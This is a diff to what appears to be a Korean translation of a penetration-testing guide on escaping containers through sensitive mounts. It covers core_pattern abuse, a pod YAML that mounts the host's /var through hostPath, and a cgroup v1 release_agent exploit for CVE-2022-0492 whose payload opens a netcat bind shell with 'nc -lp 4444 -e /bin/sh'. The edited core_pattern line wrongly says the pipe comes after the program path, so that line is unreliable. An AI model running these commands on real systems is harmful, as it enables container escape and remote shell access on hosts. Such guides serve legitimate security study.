@@ -15,7 +15,7 @@
 #### **`/proc/sys/kernel/core_pattern`**
 
 - [core(5)](https://man7.org/linux/man-pages/man5/core.5.html)에서 설명됨.
-- 이 파일에 쓸 수 있다면, 파이프 `|` 뒤에 프로그램이나 스크립트의 경로를 작성하여 충돌이 발생한 후 실행되도록 할 수 있습니다.
+- 이 파일에 쓸 수 있다면, 프로그램이나 스크립트의 경로 뒤에 파이프 `|`를 써서 충돌이 발생한 후 실행될 수 있습니다.
 - 공격자는 `mount`를 실행하여 호스트 내에서 자신의 컨테이너로의 경로를 찾고, 그 경로를 자신의 컨테이너 파일 시스템 내의 바이너리에 쓸 수 있습니다. 그런 다음 프로그램을 충돌시켜 커널이 컨테이너 외부에서 바이너리를 실행하도록 만들 수 있습니다.
 
 - **테스트 및 악용 예시**:
@@ -199,17 +199,17 @@ metadata:
     app: pentest  
 spec:  
   containers:  
-    - name: pod-mounts-var-folder  
-      image: alpine  
-      volumeMounts:  
-        - mountPath: /host-var  
-          name: noderoot  
-      command: [ "/bin/sh", "-c", "--" ]  
-      args: [ "while true; do sleep 30; done;" ]  
+  - name: pod-mounts-var-folder  
+    image: alpine  
+    volumeMounts:  
+    - mountPath: /host-var  
+      name: noderoot  
+    command: [ "/bin/sh", "-c", "--" ]  
+    args: [ "while true; do sleep 30; done;" ]  
   volumes:  
-    - name: noderoot  
-      hostPath:  
-        path: /var
+  - name: noderoot  
+    hostPath:  
+      path: /var
 ```
 
 Inside the **pod-mounts-var-folder** container:
@@ -315,10 +315,10 @@ A similar technique works with **crictl**, **podman** or the **kubelet** API onc
 Writable **cgroup v1** mounts are also dangerous. If `/sys/fs/cgroup` is bind-mounted **rw** and the host kernel is vulnerable to **CVE-2022-0492**, an attacker can set a malicious `release_agent` and execute arbitrary code in the *initial* namespace:
 
 ```bash
-# assuming the container has CAP_SYS_ADMIN and a vulnerable kernel
+# 컨테이너가 CAP_SYS_ADMIN을 가지고 있고 취약한 커널을 가정할 때
 mkdir -p /tmp/x && echo 1 > /tmp/x/notify_on_release
 
-echo '/tmp/pwn' > /sys/fs/cgroup/release_agent   # requires CVE-2022-0492
+echo '/tmp/pwn' > /sys/fs/cgroup/release_agent   # CVE-2022-0492 필요
 
 echo -e '#!/bin/sh\nnc -lp 4444 -e /bin/sh' > /tmp/pwn && chmod +x /tmp/pwn
 sh -c "echo 0 > /tmp/x/cgroup.procs"  # empty-cgroup 이벤트를 트리거합니다.
